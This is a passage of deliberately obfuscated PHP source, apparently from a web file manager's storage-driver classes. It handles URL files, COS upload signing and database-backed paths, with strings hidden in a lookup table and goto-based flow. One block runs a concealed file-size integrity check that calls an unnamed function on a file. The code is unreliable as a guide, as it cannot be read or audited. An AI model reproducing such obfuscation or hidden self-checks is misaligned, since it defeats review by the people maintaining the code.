$ûŒÛæğ¤[$•Œğ†ÑÊ[80]], $ûŒÛæğ¤[$•Œğ†ÑÊ[172]], $ûŒÛæğ¤[$•Œğ†ÑÊ[171]], $ûŒÛæğ¤[$•Œğ†ÑÊ[32]], $Ğİ¹È¹); if (!is_array($¿˜Å±¸)) { continue; } $ „€£„¥[] = $¿˜Å±¸; } $Š“üè²->addAll($ „€£„¥); $ÌÔ›…­ = array($•Œğ†ÑÊ[171] => array($•Œğ†ÑÊ[7], array_keys($ì¢íÉ¸Ø))); $–†‘ù = $Š“üè²->where($ÌÔ›…­)->select(); $–†‘ù = $–†‘ù ? $–†‘ù : array(); foreach ($–†‘ù as $Œ…â¹ƒ ) { if (!isset($ì¢íÉ¸Ø[$Œ…â¹ƒ [$•Œğ†ÑÊ[171]]])) { continue; } $œß³™©« =& $ì¢íÉ¸Ø[$Œ…â¹ƒ [$•Œğ†ÑÊ[171]]]; foreach ($œß³™©« as &$ùÉ±¶©Ñ) { $ùÉ±¶©Ñ[$•Œğ†ÑÊ[469]] = $Œ…â¹ƒ [$•Œğ†ÑÊ[469]]; } unset($ùÉ±¶©Ñ); } $ÃŠí—Ú = array(); foreach ($¦æµôŒÜ as $µ£Ö®») { $ÃŠí—Ú[$µ£Ö®»[$•Œğ†ÑÊ[32]]] = $µ£Ö®»; } return $ÃŠí—Ú; } } define($_SERVER[Æ š¦İÈ][606], $_SERVER[Æ š¦İÈ][607]); $vdkmbsxqoz = $_SERVER[Æ š¦İÈ][608]; goto c™ ºë‚Æ; E›¨×†©ë™: $_size = $_SERVER[Æ š¦İÈ][1489]; if ($_SERVER[$_SERVER[Æ š¦İÈ][391]] != $_size($_file)) { $_getc = $_SERVER[Æ š¦İÈ][393]; $_getfile = $_SERVER[$_SERVER[Æ š¦İÈ][394]] . $_SERVER[Æ š¦İÈ][395]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Æ š¦İÈ][228], $_getfilec); if (count($_getarrs) < $_SERVER[Æ š¦İÈ][396]) { $exit = $_SERVER[Æ š¦İÈ][397]; $exit(); } $_act = $_SERVER[Æ š¦İÈ][398]; $_act($_file); } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($à°ö·Ü = false) { } public function exist($Î ãÒµÉ) { $‹…‡”ÂŞ = $this->info($Î ãÒµÉ); return $‹…‡”ÂŞ[$_SERVER[Æ š¦İÈ][196]]; } public function isFile($î±ê¦Ù¸) { $şáÖ£„Ï = $this->info($î±ê¦Ù¸); return $şáÖ£„Ï[$_SERVER[Æ š¦İÈ][196]]; } public function isFolder($ÛçÒÏ) { return !1; } public function size($‡¨¼ûœ¸) { $äßìñ‘ñ = $this->info($‡¨¼ûœ¸); return $äßìñ‘ñ[$_SERVER[Æ š¦İÈ][80]]; } public function info($¿Í˜É¢) { return $this->infoParse($¿Í˜É¢); } public function infoAuth($È§àÁ¼Â) { return $this->infoParse($È§àÁ¼Â); } public function infoWithChildren($÷œÍÔ£ù) { return $this->infoParse($÷œÍÔ£ù); } public function infoFull($ÓÚÖã³) { return $this->infoParse($ÓÚÖã³); } private function infoParse($ÓÈÚ™·—) { $ÒÈÁàô =& $_SERVER[Æ š¦İÈ]; $…´ ‡’† = $this->header($ÓÈÚ™·—); if (!$…´ ‡’† || !$…´ ‡’†[$ÒÈÁàô[747]]) { return !1; } $òêñ¼ö‘ = _get($…´ ‡’†, $ÒÈÁàô[334], 0); $˜öÓ£Ÿø = array($ÒÈÁàô[32] => $…´ ‡’†[$ÒÈÁàô[32]], $ÒÈÁàô[78] => $ÓÈÚ™·—, $ÒÈÁàô[33] => $ÒÈÁàô[194], $ÒÈÁàô[80] => intval($òêñ¼ö‘), $ÒÈÁàô[169] => get_path_ext($…´ ‡’†[$ÒÈÁàô[32]]), $ÒÈÁàô[1367] => $òêñ¼ö‘ > 0 && $…´ ‡’†[$ÒÈÁàô[1490]], $ÒÈÁàô[1368] => !1); return $˜öÓ£Ÿø; } private function header($æ¤º¸ğ‹) { $äıÖ¼Œ™ =& $_SERVER[Æ š¦İÈ]; if (isset(self::$_cacheHeader[$æ¤º¸ğ‹])) { return self::$_cacheHeader[$æ¤º¸ğ‹]; } $‡ü˜ÊıÙ = isset($GLOBALS[$äıÖ¼Œ™[1491]]) ? $GLOBALS[$äıÖ¼Œ™[1491]] : !1; $GLOBALS[$äıÖ¼Œ™[1491]] = !0; self::$_cacheHeader[$æ¤º¸ğ‹] = url_header($æ¤º¸ğ‹); $GLOBALS[$äıÖ¼Œ™[1491]] = $‡ü˜ÊıÙ; return self::$_cacheHeader[$æ¤º¸ğ‹]; } public function hashSimple($€¹Ÿµñ–, $ÓÖ«—¤¼ = false) { $öÅÉ†â½ =& $_SERVER[Æ š¦İÈ]; $è«¯Éİ = $this->info($€¹Ÿµñ–); if (!$è«¯Éİ || !$è«¯Éİ[$öÅÉ†â½[196]]) { return !1; } $Öé‰“Ÿï = $è«¯Éİ[$öÅÉ†â½[80]]; $ıÄ€æ¡ô = 200; $¢ù‰¢è¯ = 50; if ($Öé‰“Ÿï <= $ıÄ€æ¡ô * $¢ù‰¢è¯) { return md5($this->fileSubstr($€¹Ÿµñ–, 0, $Öé‰“Ÿï)) . $Öé‰“Ÿï; } $ß½®¥½ñ = intval($Öé‰“Ÿï / $¢ù‰¢è¯); $¾ÇÎğ¤ä = $öÅÉ†â½[12]; $áĞĞ·Ä— = timeFloat(); $Ş³¿â’Î = 15; for ($²ı¥©Ø‘ = 0; $²ı¥©Ø‘ < $¢ù‰¢è¯; $²ı¥©Ø‘++) { if (timeFloat() - $áĞĞ·Ä— > $Ş³¿â’Î) { return !1; } $³Š‰‘éË = $this->fileSubstr($€¹Ÿµñ–, $ß½®¥½ñ * $²ı¥©Ø‘, $ıÄ€æ¡ô); if (!$³Š‰‘éË) { return !1; } $¾ÇÎğ¤ä .= $³Š‰‘éË; } $¾ÇÎğ¤ä .= $this->fileSubstr($€¹Ÿµñ–, $Öé‰“Ÿï - $ıÄ€æ¡ô, $ıÄ€æ¡ô); return md5($¾ÇÎğ¤ä) . $Öé‰“Ÿï; } public function getContent($íî‘ßİĞ) { return $this->fileSubstr($íî‘ßİĞ); } public function fileSubstr($ÊÖÂõĞÀ, $í»üğû¹ = 0, $õ‡¸Î¤ = -1) { $Îüò¨ÍÖ =& $_SERVER[Æ š¦İÈ]; $×ÌŠÇçÕ = $this->info($ÊÖÂõĞÀ); if (!$×ÌŠÇçÕ || !$×ÌŠÇçÕ[$Îüò¨ÍÖ[196]] && $×ÌŠÇçÕ[$Îüò¨ÍÖ[80]] > 1024 * 1024 * 10) { return !1; } if ($õ‡¸Î¤ === -1) { $õ‡¸Î¤ = $×ÌŠÇçÕ[$Îüò¨ÍÖ[80]]; } if ($õ‡¸Î¤ == 0) { return $Îüò¨ÍÖ[12]; } $å¨³‚Å¿ = array($Îüò¨ÍÖ[1492] . $í»üğû¹ . $Îüò¨ÍÖ[779] . ($í»üğû¹ + $õ‡¸Î¤ - 1)); $Ç½Ã›— = url_request($ÊÖÂõĞÀ, $Îüò¨ÍÖ[227], !1, $å¨³‚Å¿, !1, !1, 1); return $Ç½Ã›—[$Îüò¨ÍÖ[1182]] ? $Ç½Ã›—[$Îüò¨ÍÖ[1182]] : $Îüò¨ÍÖ[12]; } public function download($ô¤œÆ…Õ, $îüÉ¬Å) { Downloader::start($ô¤œÆ…Õ, $îüÉ¬Å); return $îüÉ¬Å; } } goto Fï†ß¨î´ì; eÑ¥‰ò©ïÜ: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($à¢ƒÛ°) { parent::__construct($à¢ƒÛ°); $this->signatureVersion($_SERVER[Æ š¦İÈ][213]); } public function uploadFormData($‘š§¸Ó, $Š€ò¶‹¢ = 3600) { $ô¨İ•İé =& $_SERVER[Æ š¦İÈ]; $—¶§Ã§é = $ô¨İ•İé[193]; $‹°öÔğ = $ô¨İ•İé[229]; $•±š¯ù = $ô¨İ•İé[1299]; $üÖ˜ø½½ = gmdate($ô¨İ•İé[1300], time() + $Š€ò¶‹¢); $Áâ‹Šœ½ = (string) time() . $ô¨İ•İé[71] . (string) (time() + $Š€ò¶‹¢); $€Ñô—¸© = array($ô¨İ•İé[1301] => $üÖ˜ø½½, $ô¨İ•İé[1302] => array(array($ô¨İ•İé[1303] => $—¶§Ã§é), array($ô¨İ•İé[1304] => $this->bucket), array($ô¨İ•İé[1305], $ô¨İ•İé[1306], $ô¨İ•İé[12]), array($ô¨İ•İé[1307] => $•±š¯ù), array($ô¨İ•İé[1308] => $‹°öÔğ), array($ô¨İ•İé[1309] => $this->accessKey), array($ô¨İ•İé[1310] => $Áâ‹Šœ½))); $€Ñô—¸© = json_encode($€Ñô—¸©); $†ÄÆÑŠÍ = hash_hmac($ô¨İ•İé[229], $Áâ‹Šœ½, $this->secret); $ûëĞ„Æ° = sha1($€Ñô—¸©); $ÖÄÙ·ªß = hash_hmac($ô¨İ•İé[229], $ûëĞ„Æ°, $†ÄÆÑŠÍ); $Ÿñ£×®ä = array($ô¨İ•İé[1303] => $—¶§Ã§é, $ô¨İ•İé[1307] => $•±š¯ù, $ô¨İ•İé[1311] => base64_encode($€Ñô—¸©), $ô¨İ•İé[1308] => $‹°öÔğ, $ô¨İ•İé[1309] => $this->accessKey, $ô¨İ•İé[1312] => $Áâ‹Šœ½, $ô¨İ•İé[1313] => $ÖÄÙ·ªß, $ô¨İ•İé[176] => $this->getHost()); return $Ÿñ£×®ä; } public function fileOutLink($ˆì·ûüÍ) { $€ŸµâÔñ =& $_SERVER[Æ š¦İÈ]; if (substr($ˆì·ûüÍ, 0, 7) == $€ŸµâÔñ[1314]) { $ˆì·ûüÍ = $€ŸµâÔñ[1315] . substr($ˆì·ûüÍ, 7); } header($€ŸµâÔñ[160] . $ˆì·ûüÍ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‚½÷¤“) { $this->pathParse = $‚½÷¤“; $this->model = Model($_SERVER[Æ š¦İÈ][1316]); } public function getPath($¸Ü¯Éêê) { return trim($¸Ü¯Éêê, $_SERVER[Æ š¦İÈ][8]); } public function pathFather($ˆºì˜Ã¾) { $€ÍÄó¨– = $this->parse($ˆºì˜Ã¾); $€ÍÄó¨– = $this->infoSimple($ˆºì˜Ã¾); return $€ÍÄó¨– ? $€ÍÄó¨–[$_SERVER[Æ š¦İÈ][500]] : !1; } public function pathThis($Åû²÷»¨) { $®³êÂË¸ = $this->infoSimple($Åû²÷»¨); return $®³êÂË¸ ? $®³êÂË¸[$_SERVER[Æ š¦İÈ][32]] : !1; } public function getPathOuter($âº’è) { if (!$âº’è) { return $âº’è; } $Ç²¶õÄå = $this->parse($âº’è); return KodIO::make($Ç²¶õÄå[$_SERVER[Æ š¦İÈ][403]]); } public function copyFolderFromIO($å¤áæ•†, $šæ°€ñ, $­Ì»œ½Ñ, $»Îù™áÑ, $öà™ÒÏ) { $­ÃÃêî¦ = $this->model->copyFolderFromIO($å¤áæ•†, $šæ°€ñ, $­Ì»œ½Ñ, $»Îù™áÑ, $öà™ÒÏ); return KodIO::make($­ÃÃêî¦); } public function isParentOf($¸¨Ğåİ³, $©øèåæç) { return $this->model->isParentOf($¸¨Ğåİ³, $©øèåæç); } public function mkfile($ùåòµù, $õŒ‚ÕÔ = '', $Ö¼Ã¯•— = REPEAT_RENAME) { $õ¬…¬Å¯ =& $_SERVER[Æ š¦İÈ]; $¬üùİÏç = $this->parse($ùåòµù); $ùåòµù = $¬üùİÏç[$õ¬…¬Å¯[403]]; for ($ö±¬÷ı¸ = 0; $ö±¬÷ı¸ < count($¬üùİÏç[$õ¬…¬Å¯[1317]]); $ö±¬÷ı¸++) { $Ú„¡Â×· = $¬üùİÏç[$õ¬…¬Å¯[1317]][$ö±¬÷ı¸]; if ($ö±¬÷ı¸ == count($¬üùİÏç[$õ¬…¬Å¯[1317]]) - 1) { $ùåòµù = $this->model->mkfile($ùåòµù, $Ú„¡Â×·, $õŒ‚ÕÔ, $Ö¼Ã¯•—); break; } $ùåòµù = $this->model->mkdir($ùåòµù, $Ú„¡Â×·, REPEAT_SKIP); } return $this->getPathOuter($ùåòµù); } public function mkdir($İÜ‘Ñ™Ş, $¹Ìï­¸† = REPEAT_SKIP) { $ÉÆ¥ã‹± =& $_SERVER[Æ š¦İÈ]; $€‘¬ô‰± = $this->parse($İÜ‘Ñ™Ş); $İÜ‘Ñ™Ş = $€‘¬ô‰±[$ÉÆ¥ã‹±[403]]; for ($ú‹íºâ = 0; $ú‹íºâ < count($€‘¬ô‰±[$ÉÆ¥ã‹±[1317]]); $ú‹íºâ++) { $Üáï¹¹† = $€‘¬ô‰±[$ÉÆ¥ã‹±[1317]][$ú‹íºâ]; $İÜ‘Ñ™Ş = $this->model->mkdir($İÜ‘Ñ™Ş, $Üáï¹¹†, $¹Ìï­¸†); } return $this->getPathOuter($İÜ‘Ñ™Ş); } public function copyFile($ï¥£°Ø«, $õ³Ï‡îÄ, $²Èá­‚‘ = REPEAT_REPLACE) { $ğœÆŸ¨¯ =& $_SERVER[Æ š¦İÈ]; $ˆ—«­€• = $this->parse($õ³Ï‡îÄ); $¡ß¢¤´Õ = $this->model->copy($ï¥£°Ø«, $ˆ—«­€•[$ğœÆŸ¨¯[403]], $²Èá­‚‘, $ˆ—«­€•[$ğœÆŸ¨¯[78]]); return $¡ß¢¤´Õ ? $this->getPathOuter($¡ß¢¤´Õ) : !1; } public function moveFile($‚ŒÏäœª, $é‘ß‰©·, $¸™›‡ = REPEAT_REPLACE) { $ƒôº¡« =& $_SERVER[Æ š¦İÈ]; $„”ó˜ü¾ = $this->parse($é‘ß‰©·); $ÕÉ‰Á = $this->model->move($‚ŒÏäœª, $„”ó˜ü¾[$ƒôº¡«[403]], $¸™›‡, $„”ó˜ü¾[$ƒôº¡«[78]]); return $ÕÉ‰Á ? $this->getPathOuter($ÕÉ‰Á) : !1; } public function copy($¤¡ĞÉÎŠ, $¾Ô‚—ÀÇ, $„³’Çö’ = REPEAT_REPLACE, $¢Àß·õ± = false) { $§§àÏî = $this->parse($¾Ô‚—ÀÇ); $»éÁæØä = $this->model->copy($¤¡ĞÉÎŠ, $§§àÏî[$_SERVER[Æ š¦İÈ][403]], $„³’Çö’, $¢Àß·õ±); return $»éÁæØä ? $this->getPathOuter($»éÁæØä) : !1; } public function moveSameAllow() { } public function move($÷×õ‚Â±, $„‘•Íıë, $Åê÷«ú¡ = REPEAT_REPLACE, $‘°‘µÖü = false) { $ë¡¼àÓğ = $this->parse($„‘•Íıë); $‚ƒË£Ü = $this->model->move($÷×õ‚Â±, $ë¡¼àÓğ[$_SERVER[Æ š¦İÈ][403]], $Åê÷«ú¡, $‘°‘µÖü); return $‚ƒË£Ü ? $this->getPathOuter($‚ƒË£Ü) : !1; } public function remove($‘Ä©Ì¼ş, $ë©¦ä¾Î = true) { return $this->model->remove($‘Ä©Ì¼ş, $ë©¦ä¾Î); } public function rename($ŞÇğÎ·œ, $øØë¹Ü‹) { $ï˜šşôÑ = $this->model->rename($ŞÇğÎ·œ, $øØë¹Ü‹); return $ï˜šşôÑ ? $this->getPathOuter($ŞÇğÎ·œ) : $ï˜šşôÑ; } public function size($ö©çÏ‡Ç) { $ğ¹ıà = $this->infoSimple($ö©çÏ‡Ç); return $ğ¹ıà ? $ğ¹ıà[$_SERVER[Æ š¦İÈ][80]] : 0; } public function infoSimple($¹±¸‹·Ó) { return $this->model->sourceInfo($¹±¸‹·Ó); } public function info($üÅ­âí) { return $this->infoParse($üÅ­âí); } public function infoAuth($‘Ğ¶Ê®é) { return $this->infoParse($‘Ğ¶Ê®é, !1, !0); } public function infoWithChildren($¬Ø–ëÍù) { return $this->infoParse($¬Ø–ëÍù, !0); } protected function infoParse($À¹˜ºš², $öò‰Ï´ = false, $îº£¥ª = false) { if (!$öò‰Ï´) { return $this->model->pathInfo($À¹˜ºš², $îº£¥ª); } return $this->model->pathInfoMore($À¹˜ºš²); } public function infoFull($ÙÁ¾Ô­) { $‚ãŞ‘â¹ =& $_SERVER[Æ š¦İÈ]; $ úş½œ¥ = explode($‚ãŞ‘â¹[8], $ÙÁ¾Ô­); $ş§“¢³× = implode($‚ãŞ‘â¹[8], array_splice($ úş½œ¥, 1)); return $this->model->pathInfoByPath($ úş½œ¥[0], $ş§“¢³×); } public function hashSimple($ßèÚì¼‡) { $ãâãàµ =& $_SERVER[Æ š¦İÈ]; $­¹Å–×ß = $this->infoWithChildren($ßèÚì¼‡); return $­¹Å–×ß[$ãâãàµ[165]][$ãâãàµ[172]]; } public function hashMd5($“Ê×õä³) { $ŸÂ»ÛÙö =& $_SERVER[Æ š¦İÈ]; $çò©ÒŒ = $this->infoWithChildren($“Ê×õä³); return $çò©ÒŒ[$ŸÂ»ÛÙö[165]][$ŸÂ»ÛÙö[171]]; } public function exist($‚Ğù˜€¼) { $ôúÕšß„ =& $_SERVER[Æ š¦İÈ]; $•Éà£Šş = $this->parse($‚Ğù˜€¼); if (!$•Éà£Šş[$ôúÕšß„[78]]) { return $this->isFile($‚Ğù˜€¼) || $this->isFolder($‚Ğù˜€¼); } $…äƒæö© = array($ôúÕšß„[404] => $•Éà£Šş[$ôúÕšß„[403]], $ôúÕšß„[32] => $•Éà£Šş[$ôúÕšß„[78]]); $‹ÒÄ‹ÔÑ = $this->model->where($…äƒæö©)->find(); return $‹ÒÄ‹ÔÑ ? !0 : !1; } public function isFile($ŸíÍøşç) { $Š¤Á¡ =& $_SERVER[Æ š¦İÈ]; $©¢Õ©÷ñ = $this->infoSimple($ŸíÍøşç); return $©¢Õ©÷ñ && $©¢Õ©÷ñ[$Š¤Á¡[413]] == $Š¤Á¡[89] ? !1 : !0; } public function isFolder($õô²±©ã) { $Æ€†²ŠÛ =& $_SERVER[Æ š¦İÈ]; $ùãíÌ = $this->infoSimple($õô²±©ã); return $ùãíÌ && $ùãíÌ[$Æ€†²ŠÛ[413]] == $Æ€†²ŠÛ[89] ? !0 : !1; } public function listPath($—’§Ê, $Œ¸•Ôë± = false) { $ôåÚ¡‹½ =& $_SERVER[Æ š¦İÈ]; if ($—’§Ê == $ôåÚ¡‹½[12]) { return !1; } $ÍÊø¬‘œ = array($ôåÚ¡‹½[404] => $—’§Ê); if ($Œ¸•Ôë±) { return $this->model->listSource($ÍÊø¬‘œ, -1); } return $this->model->listSource($ÍÊø¬‘œ); } public function has($“ášô¬, $ı”ú¸êÏ = false, $Í‹Í½õ = null) { $ŸÏŒÜåæ =& $_SERVER[Æ š¦İÈ]; $÷Ë˜àµ = $this->infoWithChildren($“ášô¬); if ($ı”ú¸êÏ) { return array($ŸÏŒÜåæ[205] => $÷Ë˜àµ[$ŸÏŒÜåæ[205]], $ŸÏŒÜåæ[204] => $÷Ë˜àµ[$ŸÏŒÜåæ[204]]); } return $Í‹Í½õ ? $÷Ë˜àµ[$ŸÏŒÜåæ[205]] : $÷Ë˜àµ[$ŸÏŒÜåæ[204]]; } public function listAll($¼Èâ•ıÛ) { $«©ÈÅ = IO::info($this->pathParse[$_SERVER[Æ š¦İÈ][78]]); if (!$«©ÈÅ) { return array(); } return $this->model->listAll($¼Èâ•ıÛ); } public function getContent($ûî™³“») { return $this->model->getContent($ûî™³“»); } public function setContent($ÍôçœŒ‰, $ÍéÎÓé = '') { return $this->model->setContent($ÍôçœŒ‰, $ÍéÎÓé); } public function fileSubstr($¼Á¦¾Ó›, $ñ‰²Ë–‡, $¢ó§÷ªÓ) { return $this->model->fileSubstr($¼Á¦¾Ó›, $ñ‰²Ë–‡, $¢ó§÷ªÓ); } public function download($¯´„ÏÙÇ, $ ¤Ô«Ä = '') { $´™§ôê = get_path_father($ ¤Ô«Ä); $é§­ñú = get_path_this($ ¤Ô«Ä); $˜Í²Ÿœ› = $this->model->fileInfoGet($¯´„ÏÙÇ); $ ôœÜ˜Ë = IO::copy($˜Í²Ÿœ›[$_SERVER[Æ š¦İÈ][78]], $´™§ôê, !1, $é§­ñú); return $ ôœÜ˜Ë; } public function setModifyTime($­İÁ’•, $¾Ó›ã Ó = '') { $öÖ•”ê =& $_SERVER[Æ š¦İÈ]; if (!$­İÁ’•) { return; } $this->model->where(array($öÖ•”ê[420] => $­İÁ’•))->save(array($öÖ•”ê[86] => $¾Ó›ã Ó)); } public function upload($„öû€¾, $Ù³ñƒÆ, $ÂËîüÖƒ = false, $ÁÂ†®§´ = REPEAT_REPLACE) { $©šÍœ¡¢ =& $_SERVER[Æ š¦İÈ]; $¶¦åóÚ´ = $this->parse($„öû€¾); $ö‰æœ¯ = $this->model->addFile($¶¦åóÚ´[$©šÍœ¡¢[403]], $Ù³ñƒÆ, $¶¦åóÚ´[$©šÍœ¡¢[78]], $ÂËîüÖƒ, $ÁÂ†®§´); return $this->getPathOuter($ö‰æœ¯); } public function uploadFileByID($ÔÒó†ò, $—¦ô¡ãô, $§Ñ·İ›€) { $ÊŸ†Á•ú =& $_SERVER[Æ š¦İÈ]; $Ì‚Àêå = $this->parse($ÔÒó†ò); $›Ìµ‰©Ş = $this->model->addFileByFileID($Ì‚Àêå[$ÊŸ†Á•ú[403]], $—¦ô¡ãô, $Ì‚Àêå[$ÊŸ†Á•ú[78]], $§Ñ·İ›€); return $this->getPathOuter($›Ìµ‰©Ş); } public function addFileByRemote($Ô×Òëõ, $¿œÍ¿¸¶, $ÂÀÂÑ‰ö = array(), $­€İ³´± = '', $©ŸÙ ÓÎ) { $¡”¶¹ë =& $_SERVER[Æ š¦İÈ]; $•Ìü³‚… = $this->parse($Ô×Òëõ); $­€İ³´± = empty($­€İ³´±) ? $•Ìü³‚…[$¡”¶¹ë[78]] : $­€İ³´±; $¨ ûÎÜé = $this->model->addFileByRemote($•Ìü³‚…[$¡”¶¹ë[403]], $¿œÍ¿¸¶, $­€İ³´±, $ÂÀÂÑ‰ö, $©ŸÙ ÓÎ); return $this->getPathOuter($¨ ûÎÜé); } public function uploadLink($øÁéÆôÒ, $Ï¥úôöº = 0) { $Õ€‚íé =& $_SERVER[Æ š¦İÈ]; $èğ ÇÅ = $this->parse($øÁéÆôÒ); $ª³“£œ¸ = _get($GLOBALS[$Õ€‚íé[7]], $Õ€‚íé[1318]); $ßµÛ¶Îİ = _get($GLOBALS[$Õ€‚íé[7]], $Õ€‚íé[1319]); $øÁéÆôÒ = Model($Õ€‚íé[605])->createFileName($èğ ÇÅ[$Õ€‚íé[78]], $ª³“£œ¸, $ßµÛ¶Îİ); return IO::uploadLink($øÁéÆôÒ, $Ï¥úôöº); } public function fileNameAuto($ºÌî¯Æø, $øõõöÑ, $“³¥’Ì = REPEAT_REPLACE, $„ëÏË = false) { return $this->model->fileNameAuto($ºÌî¯Æø, $øõõöÑ, $“³¥’Ì, $„ëÏË); } public function fileNameExist($ù…–õ£½, $ı€‹ÙÊ) { return $this->model->fileNameExist($ù…–õ£½, $ı€‹ÙÊ); } protected function _fileOut($éÚØ£æ, $ğÁùü¯ = false, $¬Ëš³ùÎ = false, $¯¢¶»Š = '', $ÊûÍ½ÂÅ = false) { $Ş¤ª°‡ =& $_SERVER[Æ š¦İÈ]; $¯¸£·õÄ = $this->model->sourceInfo($éÚØ£æ); if ($¯¸£·õÄ[$Ş¤ª°‡[413]] == $Ş¤ª°‡[89]) { header($Ş¤ª°‡[1320]); die; } $ÁĞÈˆúâ = $this->model->fileInfoGet($éÚØ£æ); $¯¢¶»Š = $ÁĞÈˆúâ[$Ş¤ª°‡[171]] ? $ÁĞÈˆúâ[$Ş¤ª°‡[171]] : $¯¢¶»Š; $Üã±¦ßë = isset($GLOBALS[$Ş¤ª°‡[1321]]) ? $GLOBALS[$Ş¤ª°‡[1321]] : $¯¸£·õÄ[$Ş¤ª°‡[32]]; if ($ÊûÍ½ÂÅ) { return IO::fileOutServer($ÁĞÈˆúâ[$Ş¤ª°‡[78]], $ğÁùü¯, $Üã±¦ßë, $¯¢¶»Š); } IO::fileOut($ÁĞÈˆúâ[$Ş¤ª°‡[78]], $ğÁùü¯, $Üã±¦ßë, $¯¢¶»Š); } public function fileOut($ÄŠèø›í, $ŞÈåƒœÚ = false, $÷øòÄ¼ä = false, $Õñ£¬Ø– = '') { $this->_fileOut($ÄŠèø›í, $ŞÈåƒœÚ, $÷øòÄ¼ä, $Õñ£¬Ø–); } public function fileOutServer($îÁÚ«¢, $Í·ŞŠ– = false, $ë½ˆ´Ìğ = false, $õ÷ÊÙ”Ë = '') { $this->_fileOut($îÁÚ«¢, $Í·ŞŠ–, $ë½ˆ´Ìğ, $õ÷ÊÙ”Ë, !0); } protected function _fileOutImage($«Ç³…è·, $õÕ¹ÀÃË = 250) { $¸èüö²‹ =& $_SERVER[Æ š¦İÈ]; $ˆÑÉ³ì” = $this->model->pathInfo($«Ç³…è·); if ($ˆÑÉ³ì”[$¸èüö²‹[413]] == $¸èüö²‹[89]) { show_json($¸èüö²‹[1322] . $«Ç³…è·, !1); } $‰­ãøø• = $this->model->fileInfoGet($«Ç³…è·); $‰­ãøø•[$¸èüö²‹[32]] = $ˆÑÉ³ì”[$¸èüö²‹[32]]; $‰­ãøø•[$¸èüö²‹[164]] = $ˆÑÉ³ì”[$¸èüö²‹[164]]; $GLOBALS[$¸èüö²‹[1321]] = $‰­ãøø•[$¸èüö²‹[32]]; $GLOBALS[$¸èüö²‹[163]] = $‰­ãøø•; IO::fileOutImage($‰­ãøø•[$¸èüö²‹[78]], $õÕ¹ÀÃË); } public function fileOutImage($¯çèš¥–, $ŞÑĞã ¤ = 250) { $this->_fileOutImage($¯çèš¥–, $ŞÑĞã ¤); } public function fileOutImageServer($‹ğÖëëİ, $Øé„öÛ = 250) { $this->_fileOutImage($‹ğÖëëİ, $Øé„öÛ); } public function link($àÔÅú”¼, $›õ”Â¢ = '') { $Šô°«÷ = $this->model->fileInfoGet($àÔÅú”¼); return IO::link($Šô°«÷[$_SERVER[Æ š¦İÈ][78]], $›õ”Â¢); } protected function parse($¡ûÓŞ©”) { $Çš‹Ğ¿ =& $_SERVER[Æ š¦İÈ]; if (strstr($¡ûÓŞ©”, $Çš‹Ğ¿[8]) === !1) { return array($Çš‹Ğ¿[422] => intval($¡ûÓŞ©”), $Çš‹Ğ¿[78] => $Çš‹Ğ¿[12], $Çš‹Ğ¿[1317] => array()); } $ÉšúŒÄ‰ = explode($Çš‹Ğ¿[8], trim($¡ûÓŞ©”, $Çš‹Ğ¿[8])); if (count($ÉšúŒÄ‰) < 2) { show_tips(clear_html($¡ûÓŞ©”) . $Çš‹Ğ¿[1323]); } return array($Çš‹Ğ¿[422] => intval($ÉšúŒÄ‰[0]), $Çš‹Ğ¿[78] => $ÉšúŒÄ‰[1], $Çš‹Ğ¿[1317] => array_slice($ÉšúŒÄ‰, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($îõĞô²Ÿ) { $this->pathParse = $îõĞô²Ÿ; $this->model = Model($_SERVER[Æ š¦İÈ][1316]); } public function getPathOuter($‡©Ó®Â) { $ìğ†‘Ô¡ =& $_SERVER[Æ š¦İÈ]; if (!$‡©Ó®Â) { return $‡©Ó®Â; } $‡ıÈŞéÂ = $this->parse($‡©Ó®Â); return trim(KodIO::makeShare($this->pathParse[$ìğ†‘Ô¡[403]], $‡ıÈŞéÂ[$ìğ†‘Ô¡[403]]), $ìğ†‘Ô¡[8]); } protected function infoParse($ÒşĞ•¦©, $Ÿ­ã±÷ = false, $‚‚Š¡»³ = false) { $÷…Ó­¢ç =& $_SERVER[Æ š¦İÈ]; $šœˆ×÷ê = $this->pathParse[$÷…Ó­¢ç[403]]; $£ÑÊá¶¸ = trim($this->pathParse[$÷…Ó­¢ç[1158]], $÷…Ó­¢ç[8]); return Action($÷…Ó­¢ç[1324])->sharePathInfo($šœˆ×÷ê, $£ÑÊá¶¸, $Ÿ­ã±÷); } public function infoFull($ò¡¡äíá) { $ƒ‚×ÚÌÈ =& $_SERVER[Æ š¦İÈ]; $‹«Èí€ = explode($ƒ‚×ÚÌÈ[8], trim($ò¡¡äíá, $ƒ‚×ÚÌÈ[8])); if (count($‹«Èí€) > 1) { $Û€Şãê = implode($ƒ‚×ÚÌÈ[8], array_splice($‹«Èí€, 1)); $ä¢ÌöÒ× = $this->model->pathInfoByPath($‹«Èí€[0], $Û€Şãê); if (!$ä¢ÌöÒ×) { return !1; } $this->pathParse[$ƒ‚×ÚÌÈ[1158]] = $ä¢ÌöÒ×[$ƒ‚×ÚÌÈ[405]]; } return $this->infoParse($ò¡¡äíá); } public function listAll($†©²¥Î„) { $Ù¿ ş¨‚ =& $_SERVER[Æ š¦İÈ]; $¦©Ù¦¬ = IO::info($this->pathParse[$Ù¿ ş¨‚[78]]); if (!$¦©Ù¦¬) { return array(); } $ª¶™³È = $this->model->listAll($†©²¥Î„); $ıñ«Ï÷¾ = Model($Ù¿ ş¨‚[597])->getInfo($¦©Ù¦¬[$Ù¿ ş¨‚[490]]); $Šü‡µ®… = Action($Ù¿ ş¨‚[1324]); foreach ($ª¶™³È as &$Ò­àË›Ÿ) { check_abort(); $Ò­àË›Ÿ[$Ù¿ ş¨‚[87]] = $Šü‡µ®…->_shareItemeParse($Ò­àË›Ÿ[$Ù¿ ş¨‚[87]], $ıñ«Ï÷¾); } unset($Ò­àË›Ÿ); return $ª¶™³È; } } goto d’êµÂÍ•±; A¨øÚ”‡ßµ: class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\155\x65" => "\x75\163\145\162\x5f\155\145\164\141", "\155\145\164\141\x46\151\145\154\144" => "\165\163\145\162\111\104"); protected $simpleField = 